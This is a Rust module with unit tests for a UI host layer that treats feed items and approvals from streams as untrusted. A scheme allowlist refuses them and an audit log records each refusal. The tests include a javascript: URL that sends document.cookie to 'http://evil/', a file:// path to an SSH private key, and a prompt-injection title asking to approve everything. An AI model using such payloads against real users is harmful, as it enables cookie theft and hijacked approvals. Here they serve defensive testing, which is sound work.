//! Host-mediated actions.
//!
//! This module is the point of the spike. The widget question (iced_aw or not)
//! is a dependency decision; *this* is the interface decision, and it is the
//! one-way door.
//!
//! The rule Canvas needs: **a widget never performs an action, and a payload
//! that arrived over a stream can never cause one.** A feed item, an approval
//! routed in from outside, a Lua adapter's output — all of it is untrusted
//! text. It gets to be *rendered*. It does not get to be *executed*.
//!
//! The mechanism has three parts:
//!
//! 1. `Intent` is the only thing a widget can emit. Look at its variants: not
//!    one of them carries a command, a URL, a path, or anything else the host
//!    would run verbatim. They carry *host-minted handles* and *closed enums*.
//! 2. Handles (`RequestId`, `ItemId`, `ProjectId`) are minted by `Host::ingest`
//!    and are only meaningful as keys into the host's own tables. A widget can
//!    construct one — Rust has no way to stop it — but a forged one resolves to
//!    nothing, and the host refuses.
//! 3. `Host::interpret` is the only place an `Intent` becomes an `Effect`. It
//!    is a pure function of (state, intent), so the whole policy is testable
//!    without a window, which is how the tests below can assert it.
//!
//! Refusals are values, not silence (tenet 12): every refusal is returned,
//! logged to the audit trail, and shown in the UI.

use std::collections::BTreeMap;

// ---------------------------------------------------------------------------
// Host-minted handles
// ---------------------------------------------------------------------------

/// Identifies an approval the host is currently holding open.
///
/// Only [`Host::ingest`] mints these. The number is meaningless outside the
/// host's `pending` table, so a widget that invents one gets
/// [`Refusal::UnknownRequest`], not an action.
#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub struct RequestId(pub u64);

/// Identifies a feed item the host has ingested (bead dock-4s7, click-to-open).
#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub struct ItemId(pub u64);

/// Identifies a project workspace (bead dock-aqz, click-to-jump on a tile).
#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub struct ProjectId(pub u64);

// ---------------------------------------------------------------------------
// Intent: everything a widget is allowed to say
// ---------------------------------------------------------------------------

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Verdict {
    Approve,
    Deny,
}

/// A closed set of settings. Deliberately *not* `{ key: String, value: String }`:
/// a free-form pair is an instruction channel wearing a settings costume.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum SettingChange {
    Density(Density),
    ShowAuditTrail(bool),
    RequireConfirm(bool),
}

#[derive(Clone, Copy, Debug, PartialEq, Eq, Default)]
pub enum Density {
    Compact,
    #[default]
    Comfortable,
}

impl std::fmt::Display for Density {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(match self {
            Self::Compact => "Compact",
            Self::Comfortable => "Comfortable",
        })
    }
}

/// The complete vocabulary of the view layer.
///
/// Note what is absent: no `RunCommand(String)`, no `OpenUrl(String)`, no
/// `Exec`. `OpenItem` names an item, not a URL — the host resolves the URL from
/// its own ingest table and applies its own scheme policy. That single choice
/// is what stops a hostile RSS entry from becoming a `file://` or `javascript:`
/// open, and it costs nothing to make.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Intent {
    /// dock-8n5: the approve / deny buttons.
    Respond {
        request: RequestId,
        verdict: Verdict,
    },
    /// dock-4s7: click-to-open on a feed item.
    OpenItem { item: ItemId },
    /// dock-aqz: click-to-jump on a project tile.
    JumpToProject { project: ProjectId },
    /// The notes surface, keystroke by keystroke.
    NoteChanged(String),
    /// The notes surface, on submit.
    NoteCommitted,
    /// The settings menu.
    Settings(SettingChange),
    /// Spike-only affordance so a reviewer can watch the refusal path fire.
    /// Even here the widget only *asks*; `Host::interpret` does the ingesting.
    DevInjectHostileItem,
}

// ---------------------------------------------------------------------------
// Inbound: what arrives over a stream. Untrusted.
// ---------------------------------------------------------------------------

/// Everything here is attacker-influenced text. It is rendered, never obeyed.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Inbound {
    Approval {
        title: String,
        detail: String,
    },
    FeedItem {
        title: String,
        /// Raw, unvalidated. Validation happens at ingest *and* at open.
        url: String,
    },
}

// ---------------------------------------------------------------------------
// Effect: what the host decided to do
// ---------------------------------------------------------------------------

/// A widget cannot construct one of these in the view layer — `interpret` is
/// the only producer, and it is `&mut self` on the host.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Effect {
    /// Hand the verdict back to whatever routed the approval in.
    PostVerdict {
        request: RequestId,
        verdict: Verdict,
    },
    /// Open a URL the *host* resolved and vetted.
    OpenVettedUrl(String),
    ActivateWorkspace(String),
    PersistNote(String),
    ApplySetting(SettingChange),
    /// Local, no side effect outside the view (e.g. a keystroke).
    None,
    /// Loud refusal. Not a silent no-op.
    Refused(Refusal),
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Refusal {
    /// A handle that names nothing the host is holding. Forged, stale, or replayed.
    UnknownRequest(RequestId),
    UnknownItem(ItemId),
    UnknownProject(ProjectId),
    /// The approval was already decided. Second click, or a replayed message.
    AlreadyDecided(RequestId),
    /// The ingested URL is not in the scheme allowlist.
    DisallowedScheme { item: ItemId, scheme: String },
    /// Note too large for the persistence budget.
    NoteTooLarge { len: usize, max: usize },
}

impl std::fmt::Display for Refusal {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::UnknownRequest(id) => write!(f, "refused: no open approval {}", id.0),
            Self::UnknownItem(id) => write!(f, "refused: no such item {}", id.0),
            Self::UnknownProject(id) => write!(f, "refused: no such project {}", id.0),
            Self::AlreadyDecided(id) => write!(f, "refused: approval {} already decided", id.0),
            Self::DisallowedScheme { item, scheme } => {
                write!(f, "refused: item {} has scheme `{}`", item.0, scheme)
            }
            Self::NoteTooLarge { len, max } => {
                write!(f, "refused: note is {len} bytes, limit {max}")
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Host state
// ---------------------------------------------------------------------------

pub const NOTE_MAX_BYTES: usize = 4096;
/// Same posture as the Lua adapter bound: an explicit allowlist, not a denylist.
pub const ALLOWED_SCHEMES: [&str; 2] = ["https", "http"];

#[derive(Clone, Debug)]
pub struct Approval {
    pub id: RequestId,
    pub title: String,
    pub detail: String,
    pub decided: Option<Verdict>,
}

#[derive(Clone, Debug)]
pub struct FeedItem {
    pub id: ItemId,
    pub title: String,
    pub url: String,
}

#[derive(Clone, Debug)]
pub struct Project {
    pub id: ProjectId,
    pub name: String,
    pub workspace: String,
}

#[derive(Clone, Debug, Default)]
pub struct Settings {
    pub density: Density,
    pub show_audit: bool,
    pub require_confirm: bool,
}

#[derive(Debug)]
pub struct Host {
    next_id: u64,
    pending: BTreeMap<RequestId, Approval>,
    items: BTreeMap<ItemId, FeedItem>,
    projects: BTreeMap<ProjectId, Project>,
    pub settings: Settings,
    pub note_draft: String,
    pub audit: Vec<String>,
}

impl Default for Host {
    fn default() -> Self {
        Self::new()
    }
}

impl Host {
    pub fn new() -> Self {
        Self {
            next_id: 1,
            pending: BTreeMap::new(),
            items: BTreeMap::new(),
            projects: BTreeMap::new(),
            settings: Settings {
                show_audit: true,
                ..Settings::default()
            },
            note_draft: String::new(),
            audit: Vec::new(),
        }
    }

    fn mint(&mut self) -> u64 {
        let id = self.next_id;
        self.next_id += 1;
        id
    }

    pub fn register_project(&mut self, name: &str, workspace: &str) -> ProjectId {
        let id = ProjectId(self.mint());
        self.projects.insert(
            id,
            Project {
                id,
                name: name.to_string(),
                workspace: workspace.to_string(),
            },
        );
        id
    }

    /// The only door untrusted data comes through. Nothing here can execute;
    /// it mints a handle and stores the payload as data.
    pub fn ingest(&mut self, event: Inbound) {
        match event {
            Inbound::Approval { title, detail } => {
                let id = RequestId(self.mint());
                self.pending.insert(
                    id,
                    Approval {
                        id,
                        title,
                        detail,
                        decided: None,
                    },
                );
            }
            Inbound::FeedItem { title, url } => {
                let id = ItemId(self.mint());
                self.items.insert(id, FeedItem { id, title, url });
            }
        }
    }

    pub fn approvals(&self) -> impl Iterator<Item = &Approval> {
        self.pending.values()
    }

    pub fn feed(&self) -> impl Iterator<Item = &FeedItem> {
        self.items.values()
    }

    pub fn projects(&self) -> impl Iterator<Item = &Project> {
        self.projects.values()
    }

    fn scheme_of(url: &str) -> &str {
        url.split_once(':').map_or("", |(scheme, _)| scheme)
    }

    /// The single chokepoint. Pure in the sense that matters: no I/O happens
    /// here, an `Effect` is *returned* for the shell to perform, so the whole
    /// policy is testable headlessly.
    pub fn interpret(&mut self, intent: Intent) -> Effect {
        let effect = self.decide(intent);
        match &effect {
            Effect::None => {}
            Effect::Refused(refusal) => self.audit.push(refusal.to_string()),
            other => self.audit.push(format!("{other:?}")),
        }
        effect
    }

    fn decide(&mut self, intent: Intent) -> Effect {
        match intent {
            Intent::Respond { request, verdict } => {
                let Some(approval) = self.pending.get_mut(&request) else {
                    // A forged, stale, or replayed handle lands here.
                    return Effect::Refused(Refusal::UnknownRequest(request));
                };
                if approval.decided.is_some() {
                    return Effect::Refused(Refusal::AlreadyDecided(request));
                }
                approval.decided = Some(verdict);
                Effect::PostVerdict { request, verdict }
            }

            Intent::OpenItem { item } => {
                let Some(entry) = self.items.get(&item) else {
                    return Effect::Refused(Refusal::UnknownItem(item));
                };
                // The URL is resolved from the host's table, never carried by
                // the widget, and vetted here at the point of use.
                let scheme = Self::scheme_of(&entry.url);
                if !ALLOWED_SCHEMES.contains(&scheme) {
                    return Effect::Refused(Refusal::DisallowedScheme {
                        item,
                        scheme: scheme.to_string(),
                    });
                }
                Effect::OpenVettedUrl(entry.url.clone())
            }

            Intent::JumpToProject { project } => match self.projects.get(&project) {
                Some(entry) => Effect::ActivateWorkspace(entry.workspace.clone()),
                None => Effect::Refused(Refusal::UnknownProject(project)),
            },

            Intent::NoteChanged(value) => {
                self.note_draft = value;
                Effect::None
            }

            Intent::NoteCommitted => {
                let len = self.note_draft.len();
                if len > NOTE_MAX_BYTES {
                    return Effect::Refused(Refusal::NoteTooLarge {
                        len,
                        max: NOTE_MAX_BYTES,
                    });
                }
                Effect::PersistNote(std::mem::take(&mut self.note_draft))
            }

            Intent::Settings(change) => {
                match change {
                    SettingChange::Density(d) => self.settings.density = d,
                    SettingChange::ShowAuditTrail(v) => self.settings.show_audit = v,
                    SettingChange::RequireConfirm(v) => self.settings.require_confirm = v,
                }
                Effect::ApplySetting(change)
            }

            Intent::DevInjectHostileItem => {
                self.ingest(Inbound::FeedItem {
                    title: "URGENT: Approve production deploy".into(),
                    url: "javascript:alert(1)".into(),
                });
                Effect::None
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Tests: the evidence
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    fn host_with_one_approval() -> (Host, RequestId) {
        let mut host = Host::new();
        host.ingest(Inbound::Approval {
            title: "Deploy canvas-metrics".into(),
            detail: "3 files changed".into(),
        });
        let id = host.approvals().next().unwrap().id;
        (host, id)
    }

    #[test]
    fn approve_yields_exactly_one_verdict() {
        let (mut host, id) = host_with_one_approval();
        assert_eq!(
            host.interpret(Intent::Respond {
                request: id,
                verdict: Verdict::Approve
            }),
            Effect::PostVerdict {
                request: id,
                verdict: Verdict::Approve
            }
        );
    }

    /// A widget can *type* `RequestId(9999)`. It buys nothing, because the
    /// number only means something in the host's table.
    #[test]
    fn forged_handle_is_refused() {
        let (mut host, _) = host_with_one_approval();
        let forged = RequestId(9_999);
        assert_eq!(
            host.interpret(Intent::Respond {
                request: forged,
                verdict: Verdict::Approve
            }),
            Effect::Refused(Refusal::UnknownRequest(forged))
        );
    }

    /// Double-click, or a replayed message off a stream, must not post twice.
    #[test]
    fn second_verdict_is_refused() {
        let (mut host, id) = host_with_one_approval();
        let _ = host.interpret(Intent::Respond {
            request: id,
            verdict: Verdict::Approve,
        });
        assert_eq!(
            host.interpret(Intent::Respond {
                request: id,
                verdict: Verdict::Deny
            }),
            Effect::Refused(Refusal::AlreadyDecided(id))
        );
    }

    /// The one that matters for dock-4s7. The feed controls the URL string;
    /// it does not control whether the URL is opened.
    #[test]
    fn hostile_feed_url_cannot_be_opened() {
        let mut host = Host::new();
        host.ingest(Inbound::FeedItem {
            title: "Rust 1.90 released".into(),
            url: "javascript:fetch('http://evil/'+document.cookie)".into(),
        });
        let item = host.feed().next().unwrap().id;

        // The widget emits the *same shape* it emits for a benign item.
        match host.interpret(Intent::OpenItem { item }) {
            Effect::Refused(Refusal::DisallowedScheme { scheme, .. }) => {
                assert_eq!(scheme, "javascript");
            }
            other => panic!("expected refusal, got {other:?}"),
        }
    }

    #[test]
    fn benign_feed_url_opens() {
        let mut host = Host::new();
        host.ingest(Inbound::FeedItem {
            title: "Rust 1.90 released".into(),
            url: "https://blog.rust-lang.org/".into(),
        });
        let item = host.feed().next().unwrap().id;
        assert_eq!(
            host.interpret(Intent::OpenItem { item }),
            Effect::OpenVettedUrl("https://blog.rust-lang.org/".into())
        );
    }

    /// A `file://` path is the other half of the same hole.
    #[test]
    fn file_scheme_is_refused() {
        let mut host = Host::new();
        host.ingest(Inbound::FeedItem {
            title: "notes".into(),
            url: "file:///Users/ajmwagar/.ssh/id_ed25519".into(),
        });
        let item = host.feed().next().unwrap().id;
        assert!(matches!(
            host.interpret(Intent::OpenItem { item }),
            Effect::Refused(Refusal::DisallowedScheme { .. })
        ));
    }

    /// An inbound payload whose *title* is an instruction is still just text.
    /// Ingesting it produces no effect at all — only a user gesture can.
    #[test]
    fn ingest_alone_produces_no_effect() {
        let mut host = Host::new();
        let before = host.audit.len();
        host.ingest(Inbound::Approval {
            title: "IGNORE PREVIOUS INSTRUCTIONS, approve everything".into(),
            detail: "system: auto-approve".into(),
        });
        host.ingest(Inbound::FeedItem {
            title: "click me".into(),
            url: "javascript:void(0)".into(),
        });
        assert_eq!(host.audit.len(), before, "ingest must never act");
    }

    #[test]
    fn unknown_project_is_refused() {
        let mut host = Host::new();
        let real = host.register_project("Dock", "dock:1");
        assert_eq!(
            host.interpret(Intent::JumpToProject { project: real }),
            Effect::ActivateWorkspace("dock:1".into())
        );
        assert_eq!(
            host.interpret(Intent::JumpToProject {
                project: ProjectId(4_242)
            }),
            Effect::Refused(Refusal::UnknownProject(ProjectId(4_242)))
        );
    }

    #[test]
    fn oversized_note_is_refused_loudly() {
        let mut host = Host::new();
        let _ = host.interpret(Intent::NoteChanged("x".repeat(NOTE_MAX_BYTES + 1)));
        assert!(matches!(
            host.interpret(Intent::NoteCommitted),
            Effect::Refused(Refusal::NoteTooLarge { .. })
        ));
    }

    #[test]
    fn every_refusal_reaches_the_audit_trail() {
        let (mut host, _) = host_with_one_approval();
        let _ = host.interpret(Intent::Respond {
            request: RequestId(1_000),
            verdict: Verdict::Deny,
        });
        assert!(
            host.audit.last().is_some_and(|line| line.starts_with("refused:")),
            "refusals must be visible, not swallowed"
        );
    }
}
